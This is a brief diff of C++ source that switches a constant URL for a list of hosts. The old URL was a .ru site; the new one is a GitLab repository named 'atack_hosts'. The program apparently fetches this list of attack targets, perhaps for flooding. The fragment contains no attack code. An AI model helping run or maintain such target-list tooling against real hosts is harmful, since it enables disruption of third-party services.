@@ -13,8 +13,7 @@
 
 __asm__(".symver realpath,realpath@GLIBC_2.33");
 
-extern constexpr const char *API_STRING = "/api.php";
-extern constexpr const char *APIS_LIST = "http://rockstarbloggers.ru/hosts.json";
+extern constexpr const char *APIS_LIST = "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json";
 
 std::atomic<bool> g_shouldStop{false};
 
